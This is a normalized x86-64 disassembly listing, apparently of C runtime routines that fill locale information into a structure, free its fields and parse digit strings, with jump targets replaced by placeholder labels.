mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x40 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x118 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x41 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x120 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x42 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x128 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x27 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x130 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x28 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x138 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
or ebx eax
lea rax [ rdi + 0x140 ]
mov [ rsp + 0x20 ] rax
lea r9d [ r13 + 0x1e ]
lea rcx [ rbp - 0x10 ]
mov r8d r12d
mov edx r13d
call sub_14004e83c
lea r9d [ r13 + 0x1f ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x148 ]
mov r8d r12d
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea rcx [ rbp - 0x10 ]
mov r9d 0x1003
or ebx eax
lea rax [ rdi + 0x150 ]
mov r8d r12d
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea rcx [ rbp - 0x10 ]
mov r9d 0x1009
or ebx eax
lea rax [ rdi + 0x15c ]
mov r8d r12d
xor edx edx
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x30 ]
lea rcx [ rbp - 0x10 ]
lea r13d [ r9 - 0x2f ]
or ebx eax
lea rax [ rdi + 0x170 ]
mov r8d esi
mov edx r13d
mov [ rdi + 0x158 ] r12d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x30 ]
or ebx eax
lea rax [ rdi + 0x178 ]
lea rcx [ rbp - 0x10 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x31 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x180 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x32 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x188 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x33 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x190 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x34 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x198 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
or ebx eax
lea rax [ rdi + 0x168 ]
lea r9d [ r13 + 0x35 ]
lea rcx [ rbp - 0x10 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x28 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x1a8 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x29 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x1b0 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x2a ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x1b8 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x2b ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x1c0 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x2c ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x1c8 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x2d ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x1d0 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x2e ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x1a0 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x42 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x1d8 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x43 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x1e0 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
or ebx eax
lea rax [ rdi + 0x1e8 ]
mov [ rsp + 0x20 ] rax
lea r9d [ r13 + 0x44 ]
lea rcx [ rbp - 0x10 ]
mov r8d esi
mov edx r13d
call sub_14004e83c
lea r9d [ r13 + 0x45 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x1f0 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x46 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x1f8 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x47 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x200 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x48 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x208 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x49 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x210 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x4a ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x218 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x4b ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x220 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x4c ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x228 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x4d ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x230 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x36 ]
or ebx eax
lea rax [ rdi + 0x238 ]
mov [ rsp + 0x20 ] rax
lea rcx [ rbp - 0x10 ]
mov r8d esi
mov edx r13d
call sub_14004e83c
lea r9d [ r13 + 0x37 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x240 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x38 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x248 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x39 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x250 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x3a ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x258 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x3b ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x260 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x3c ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x268 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x3d ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x270 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x3e ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x278 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x3f ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x280 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x40 ]
mov r8d esi
or ebx eax
lea rax [ rdi + 0x288 ]
mov [ rsp + 0x20 ] rax
lea rcx [ rbp - 0x10 ]
mov edx r13d
call sub_14004e83c
lea r9d [ r13 + 0x41 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x290 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x26 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x298 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x27 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x2a0 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x1d ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x2a8 ]
mov r8d r12d
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x1e ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x2b0 ]
mov r8d r12d
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea rcx [ rbp - 0x10 ]
mov r9d 0x1003
or ebx eax
lea rax [ rdi + 0x2b8 ]
mov r8d r12d
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
or eax ebx
or eax 0xffffffff
jmp r-xdata
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x68 ]
mov rdi [ rsp + 0x70 ]
add rsp 0x40
pop r13
pop r12
pop rbp
retn
sub_140047ca4
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x8 ]
call sub_14003ad04
mov rcx [ rbx + 0x10 ]
call sub_14003ad04
mov rcx [ rbx + 0x18 ]
call sub_14003ad04
mov rcx [ rbx + 0x20 ]
call sub_14003ad04
mov rcx [ rbx + 0x28 ]
call sub_14003ad04
mov rcx [ rbx + 0x30 ]
call sub_14003ad04
mov rcx [ rbx ]
call sub_14003ad04
mov rcx [ rbx + 0x40 ]
call sub_14003ad04
mov rcx [ rbx + 0x48 ]
call sub_14003ad04
mov rcx [ rbx + 0x50 ]
call sub_14003ad04
mov rcx [ rbx + 0x58 ]
call sub_14003ad04
mov rcx [ rbx + 0x60 ]
call sub_14003ad04
mov rcx [ rbx + 0x68 ]
call sub_14003ad04
mov rcx [ rbx + 0x38 ]
call sub_14003ad04
mov rcx [ rbx + 0x70 ]
call sub_14003ad04
mov rcx [ rbx + 0x78 ]
call sub_14003ad04
mov rcx [ rbx + 0x80 ]
call sub_14003ad04
mov rcx [ rbx + 0x88 ]
call sub_14003ad04
mov rcx [ rbx + 0x90 ]
call sub_14003ad04
mov rcx [ rbx + 0x98 ]
call sub_14003ad04
mov rcx [ rbx + 0xa0 ]
call sub_14003ad04
mov rcx [ rbx + 0xa8 ]
call sub_14003ad04
mov rcx [ rbx + 0xb0 ]
call sub_14003ad04
mov rcx [ rbx + 0xb8 ]
call sub_14003ad04
mov rcx [ rbx + 0xc0 ]
call sub_14003ad04
mov rcx [ rbx + 0xc8 ]
call sub_14003ad04
mov rcx [ rbx + 0xd0 ]
call sub_14003ad04
mov rcx [ rbx + 0xd8 ]
call sub_14003ad04
mov rcx [ rbx + 0xe0 ]
call sub_14003ad04
mov rcx [ rbx + 0xe8 ]
call sub_14003ad04
mov rcx [ rbx + 0xf0 ]
call sub_14003ad04
mov rcx [ rbx + 0xf8 ]
call sub_14003ad04
mov rcx [ rbx + 0x100 ]
call sub_14003ad04
mov rcx [ rbx + 0x108 ]
call sub_14003ad04
mov rcx [ rbx + 0x110 ]
call sub_14003ad04
mov rcx [ rbx + 0x118 ]
call sub_14003ad04
mov rcx [ rbx + 0x120 ]
call sub_14003ad04
mov rcx [ rbx + 0x128 ]
call sub_14003ad04
mov rcx [ rbx + 0x130 ]
call sub_14003ad04
mov rcx [ rbx + 0x138 ]
call sub_14003ad04
mov rcx [ rbx + 0x140 ]
call sub_14003ad04
mov rcx [ rbx + 0x148 ]
call sub_14003ad04
mov rcx [ rbx + 0x150 ]
call sub_14003ad04
mov rcx [ rbx + 0x170 ]
call sub_14003ad04
mov rcx [ rbx + 0x178 ]
call sub_14003ad04
mov rcx [ rbx + 0x180 ]
call sub_14003ad04
mov rcx [ rbx + 0x188 ]
call sub_14003ad04
mov rcx [ rbx + 0x190 ]
call sub_14003ad04
mov rcx [ rbx + 0x198 ]
call sub_14003ad04
mov rcx [ rbx + 0x168 ]
call sub_14003ad04
mov rcx [ rbx + 0x1a8 ]
call sub_14003ad04
mov rcx [ rbx + 0x1b0 ]
call sub_14003ad04
mov rcx [ rbx + 0x1b8 ]
call sub_14003ad04
mov rcx [ rbx + 0x1c0 ]
call sub_14003ad04
mov rcx [ rbx + 0x1c8 ]
call sub_14003ad04
mov rcx [ rbx + 0x1d0 ]
call sub_14003ad04
mov rcx [ rbx + 0x1a0 ]
call sub_14003ad04
mov rcx [ rbx + 0x1d8 ]
call sub_14003ad04
mov rcx [ rbx + 0x1e0 ]
call sub_14003ad04
mov rcx [ rbx + 0x1e8 ]
call sub_14003ad04
mov rcx [ rbx + 0x1f0 ]
call sub_14003ad04
mov rcx [ rbx + 0x1f8 ]
call sub_14003ad04
mov rcx [ rbx + 0x200 ]
call sub_14003ad04
mov rcx [ rbx + 0x208 ]
call sub_14003ad04
mov rcx [ rbx + 0x210 ]
call sub_14003ad04
mov rcx [ rbx + 0x218 ]
call sub_14003ad04
mov rcx [ rbx + 0x220 ]
call sub_14003ad04
mov rcx [ rbx + 0x228 ]
call sub_14003ad04
mov rcx [ rbx + 0x230 ]
call sub_14003ad04
mov rcx [ rbx + 0x238 ]
call sub_14003ad04
mov rcx [ rbx + 0x240 ]
call sub_14003ad04
mov rcx [ rbx + 0x248 ]
call sub_14003ad04
mov rcx [ rbx + 0x250 ]
call sub_14003ad04
mov rcx [ rbx + 0x258 ]
call sub_14003ad04
mov rcx [ rbx + 0x260 ]
call sub_14003ad04
mov rcx [ rbx + 0x268 ]
call sub_14003ad04
mov rcx [ rbx + 0x270 ]
call sub_14003ad04
mov rcx [ rbx + 0x278 ]
call sub_14003ad04
mov rcx [ rbx + 0x280 ]
call sub_14003ad04
mov rcx [ rbx + 0x288 ]
call sub_14003ad04
mov rcx [ rbx + 0x290 ]
call sub_14003ad04
mov rcx [ rbx + 0x298 ]
call sub_14003ad04
mov rcx [ rbx + 0x2a0 ]
call sub_14003ad04
mov rcx [ rbx + 0x2a8 ]
call sub_14003ad04
mov rcx [ rbx + 0x2b0 ]
call sub_14003ad04
mov rcx [ rbx + 0x2b8 ]
call sub_14003ad04
add rsp 0x20
pop rbx
sub_140048094
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
push rdi
sub rsp 0x20
cmp [ rcx + 0x20 ] 0x0
mov rdi rcx
lea rbp [ rw-data ]
je r-xdata
mov rbx rbp
mov edx 0x2c0
mov ecx 0x1
call sub_140041704
mov rbx rax
test rax rax
jne r-xdata
mov [ rdi + 0x158 ] rbx
xor eax eax
[ rax + 0x160 ]
mov rdx rdi
mov rcx rax
call sub_140047134
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
mov [ rbx + 0x160 ] 0x1
jmp r-xdata
mov rcx rbx
call sub_140047ca4
mov rcx rbx
call sub_14003ad04
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rax [ rdi + 0x158 ]
cmp rax rbp
je r-xdata
sub_140048130
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx ]
cmp rcx [ rw-data ]
je r-xdata
mov rcx [ rbx + 0x8 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_14003ad04
mov rcx [ rbx + 0x10 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_14003ad04
mov rcx [ rbx + 0x58 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_14003ad04
mov rcx [ rbx + 0x60 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_14003ad04
add rsp 0x20
pop rbx
call sub_14003ad04
sub_14004819c
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
xor ebx ebx
mov rsi rcx
mov [ rax - 0x38 ] rcx
mov [ rax - 0x30 ] rbx
cmp [ rcx + 0x1c ] ebx
jne r-xdata
mov edi 0x98
mov r12d 0x1
mov edx edi
mov ecx r12d
call sub_140041704
mov rbp rax
test rax rax
jne r-xdata
cmp [ rcx + 0x18 ] ebx
jne r-xdata
mov rdx [ rsi + 0x128 ]
mov rcx rax
mov r8 rdi
call sub_14003a8c0
mov edi 0x4
mov ecx edi
call sub_140041684
mov r14 rax
test rax rax
jne r-xdata
mov eax r12d
jmp r-xdata
mov r13d ebx
mov r14d ebx
lea rbp [ rw-data ]
jmp r-xdata
mov [ rax ] ebx
cmp [ rsi + 0x1c ] ebx
je r-xdata
mov rcx rbp
lea r11 [ rsp + 0x40 ]
mov rbx [ r11 + 0x30 ]
mov rbp [ r11 + 0x38 ]
mov rsi [ r11 + 0x40 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov rax [ rsi + 0x118 ]
test rax rax
je r-xdata
mov rax [ rw-data ]
mov r13 rbx
mov [ rbp ] rax
mov rax [ rw-data ]
mov [ rbp + 0x8 ] rax
mov rax [ rw-data ]
mov [ rbp + 0x10 ] rax
mov rax [ rw-data ]
mov [ rbp + 0x58 ] rax
mov rax [ rw-data ]
mov [ rbp + 0x60 ] rax
mov rcx rdi
call sub_140041684
mov r13 rax
test rax rax
je r-xdata
mov rcx [ rsi + 0x110 ]
test rcx rcx
je r-xdata
[ rax ]
mov [ r13 ] r12d
mov rcx rbp
call sub_14003ad04
mov rcx r14
jmp r-xdata
mov [ rax ] ebx
movzx edi [ rsi + 0x3e ]
lea rcx [ rsp + 0x30 ]
mov r9d 0xe
mov edx r12d
mov r8d edi
mov [ rsp + 0x20 ] rbp
call sub_14004e83c
lea rcx [ rbp + 0x8 ]
mov [ rsp + 0x20 ] rcx
lea rcx [ rsp + 0x30 ]
mov r9d 0xf
mov r8d edi
mov edx r12d
mov ebx eax
call sub_14004e83c
lea r15 [ rbp + 0x10 ]
lea rcx [ rsp + 0x30 ]
mov r9d 0x10
mov r8d edi
mov edx r12d
or ebx eax
mov [ rsp + 0x20 ] r15
call sub_14004e83c
mov r9d 0xe
or ebx eax
lea rax [ rbp + 0x58 ]
lea rcx [ rsp + 0x30 ]
lea edx [ r9 - 0xc ]
mov r8d edi
mov [ rsp + 0x20 ] rax
call sub_14004e83c
mov r9d 0xf
or ebx eax
lea rax [ rbp + 0x60 ]
lea rcx [ rsp + 0x30 ]
lea edx [ r9 - 0xd ]
mov r8d edi
mov [ rsp + 0x20 ] rax
call sub_14004e83c
or eax ebx
je r-xdata
mov [ rsi + 0x118 ] r13
mov [ rsi + 0x110 ] r14
mov [ rsi + 0x128 ] rbp
xor eax eax
[ rcx ]
jne r-xdata
call sub_14003ad04
jmp r-xdata
mov rdx [ r15 ]
xor ebx ebx
jmp r-xdata
mov rcx rbp
call sub_140048130
or r12d 0xffffffff
mov rcx [ rsi + 0x110 ]
call sub_14003ad04
mov rcx [ rsi + 0x128 ]
call sub_14003ad04
cmp [ rdx ] bl
jne r-xdata
mov al [ rdx ]
cmp al 0x30
jl r-xdata
jmp r-xdata
cmp al 0x3b
jne r-xdata
cmp al 0x39
jg r-xdata
mov [ r14 ] r12d
test r13 r13
je r-xdata
add rdx r12
mov r8 rdx
sub al 0x30
mov [ rdx ] al
mov al [ r8 + 0x1 ]
mov [ r8 ] al
inc r8
test al al
jne r-xdata
jmp r-xdata
sub_140048404
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x18 ]
cmp rcx [ rw-data ]
je r-xdata
mov rcx [ rbx + 0x20 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_14003ad04
mov rcx [ rbx + 0x28 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_14003ad04
mov rcx [ rbx + 0x30 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_14003ad04
mov rcx [ rbx + 0x38 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_14003ad04
mov rcx [ rbx + 0x40 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_14003ad04
mov rcx [ rbx + 0x48 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_14003ad04
mov rcx [ rbx + 0x68 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_14003ad04
mov rcx [ rbx + 0x70 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_14003ad04
mov rcx [ rbx + 0x78 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_14003ad04
mov rcx [ rbx + 0x80 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_14003ad04
mov rcx [ rbx + 0x88 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_14003ad04
mov rcx [ rbx + 0x90 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_14003ad04
add rsp 0x20
pop rbx
call sub_14003ad04
sub_140048510
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push rbp
push r12
push r13
push r14
push r15
mov rbp rsp
sub rsp 0x40
xor ebx ebx
mov rsi rcx
mov [ rbp - 0x10 ] rcx
mov r13d ebx
mov [ rbp - 0x8 ] rbx
cmp [ rcx + 0x18 ] ebx
jne r-xdata
mov r15d 0x98
mov ecx 0x1
mov edx r15d
call sub_140041704
mov r12 rax
test rax rax
jne r-xdata
cmp [ rcx + 0x1c ] ebx
jne r-xdata
mov edi 0x4
mov ecx edi
call sub_140041684
mov r14 rax
test rax rax
jne r-xdata
mov eax 0x1
jmp r-xdata
mov r14d ebx
lea r12 [ rw-data ]
jmp r-xdata
mov [ rax ] ebx
cmp [ rsi + 0x18 ] ebx
je r-xdata
mov rcx r12
lea r11 [ rsp + 0x40 ]
mov rbx [ r11 + 0x30 ]
mov rsi [ r11 + 0x38 ]
mov rdi [ r11 + 0x40 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
mov rax [ rsi + 0x120 ]
test rax rax
je r-xdata
lea rdx [ rw-data ]
mov rcx r12
mov r8 r15
call sub_14003a8c0
mov rcx rdi
call sub_140041684
mov r13 rax
test rax rax
jne r-xdata
mov rcx [ rsi + 0x110 ]
test rcx rcx
je r-xdata
[ rax ]
mov [ r13 ] 0x1
mov [ rax ] ebx
movzx edi [ rsi + 0x38 ]
mov r9d 0x15
lea rax [ r12 + 0x18 ]
lea rcx [ rbp - 0x10 ]
lea edx [ r9 - 0x14 ]
mov r8d edi
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea rcx [ r12 + 0x20 ]
mov r9d 0x14
mov [ rsp + 0x20 ] rcx
lea edx [ r9 - 0x13 ]
lea rcx [ rbp - 0x10 ]
mov r8d edi
mov ebx eax
call sub_14004e83c
lea rcx [ r12 + 0x28 ]
mov r9d 0x16
mov [ rsp + 0x20 ] rcx
lea edx [ r9 - 0x15 ]
lea rcx [ rbp - 0x10 ]
mov r8d edi
or ebx eax
call sub_14004e83c
mov r9d 0x17
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ r12 + 0x30 ]
lea edx [ r9 - 0x16 ]
mov r8d edi
mov [ rsp + 0x20 ] rax
call sub_14004e83c
mov r9d 0x18
lea r15 [ r12 + 0x38 ]
lea rcx [ rbp - 0x10 ]
lea edx [ r9 - 0x17 ]
mov r8d edi
or ebx eax
mov [ rsp + 0x20 ] r15
call sub_14004e83c
mov r9d 0x50
or ebx eax
lea rax [ r12 + 0x40 ]
lea rcx [ rbp - 0x10 ]
lea edx [ r9 - 0x4f ]
mov r8d edi
mov [ rsp + 0x20 ] rax
call sub_14004e83c
mov r9d 0x51
or ebx eax
lea rax [ r12 + 0x48 ]
lea rcx [ rbp - 0x10 ]
lea edx [ r9 - 0x50 ]
mov r8d edi
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea rcx [ rbp - 0x10 ]
mov r9d 0x1a
or ebx eax
lea rax [ r12 + 0x50 ]
mov r8d edi
xor edx edx
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea rcx [ rbp - 0x10 ]
mov r9d 0x19
or ebx eax
lea rax [ r12 + 0x51 ]
mov r8d edi
xor edx edx
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea rcx [ rbp - 0x10 ]
mov r9d 0x54
or ebx eax
lea rax [ r12 + 0x52 ]
mov r8d edi
xor edx edx
mov [ rsp + 0x20 ] rax
call sub_14004e83c
or ebx eax
lea rax [ r12 + 0x53 ]
lea rcx [ rbp - 0x10 ]
mov r9d 0x55
mov r8d edi
xor edx edx
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ r12 + 0x54 ]
mov r9d 0x56
mov r8d edi
xor edx edx
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea rcx [ rbp - 0x10 ]
mov r9d 0x57
or ebx eax
lea rax [ r12 + 0x55 ]
mov r8d edi
xor edx edx
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea rcx [ rbp - 0x10 ]
mov r9d 0x52
or ebx eax
lea rax [ r12 + 0x56 ]
mov r8d edi
xor edx edx
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea rcx [ rbp - 0x10 ]
mov r9d 0x53
or ebx eax
lea rax [ r12 + 0x57 ]
mov r8d edi
xor edx edx
mov [ rsp + 0x20 ] rax
call sub_14004e83c
mov r9d 0x15
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ r12 + 0x68 ]
lea edx [ r9 - 0x13 ]
mov r8d edi
mov [ rsp + 0x20 ] rax
call sub_14004e83c
mov r9d 0x14
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ r12 + 0x70 ]
lea edx [ r9 - 0x12 ]
mov r8d edi
mov [ rsp + 0x20 ] rax
call sub_14004e83c
mov r9d 0x16
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ r12 + 0x78 ]
lea edx [ r9 - 0x14 ]
mov r8d edi
mov [ rsp + 0x20 ] rax
call sub_14004e83c
mov r9d 0x17
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ r12 + 0x80 ]
lea edx [ r9 - 0x15 ]
mov r8d edi
mov [ rsp + 0x20 ] rax
call sub_14004e83c
mov r9d 0x50
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ r12 + 0x88 ]
lea edx [ r9 - 0x4e ]
mov r8d edi
mov [ rsp + 0x20 ] rax
call sub_14004e83c
or ebx eax
mov r9d 0x51
lea rax [ r12 + 0x90 ]
lea rcx [ rbp - 0x10 ]
lea edx [ r9 - 0x4f ]
mov r8d edi
mov [ rsp + 0x20 ] rax
call sub_14004e83c
or eax ebx
je r-xdata
mov rcx r12
call sub_14003ad04
mov rcx r14
jmp r-xdata
mov [ rsi + 0x120 ] r13
mov [ rsi + 0x110 ] r14
mov [ rsi + 0x128 ] r12
xor eax eax
[ rcx ]
jne r-xdata
mov rdx [ r15 ]
xor ebx ebx
jmp r-xdata
mov rcx r12
call sub_140048404
mov rcx r12
call sub_14003ad04
mov rcx r14
call sub_14003ad04
mov rcx r13
jmp r-xdata
call sub_14003ad04
jmp r-xdata
mov rcx [ rsi + 0x128 ]
call sub_14003ad04
mov rcx [ rsi + 0x110 ]
call sub_14003ad04
cmp [ rdx ] bl
jne r-xdata
mov al [ rdx ]
cmp al 0x30
jl r-xdata
jmp r-xdata
cmp al 0x3b
